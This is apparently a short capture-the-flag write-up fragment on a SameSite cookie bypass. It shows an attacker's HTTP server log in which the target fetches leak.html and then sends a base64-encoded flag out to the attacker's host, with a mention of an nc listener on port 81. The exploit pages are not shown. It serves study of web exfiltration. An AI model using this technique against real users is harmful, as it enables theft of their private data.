Make target visit leak.html page

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
52.207.14.64 - - [04/Apr/2021 08:53:55] "GET /leak.html HTTP/1.1" 200 -
52.207.14.64 - - [04/Apr/2021 08:53:55] "GET /fix_samesite.html HTTP/1.1" 200 -
52.207.14.64 - - [04/Apr/2021 08:53:57] code 404, message File not found
52.207.14.64 - - [04/Apr/2021 08:53:57] "GET /YWN0ZntqYXNvbidzX3NpdGVfaXNuJ3Rfc29fbGF4X2FmdGVyX2FsbH0= HTTP/1.1" 404 -
```

Also nc on 81 port and make target wait a little
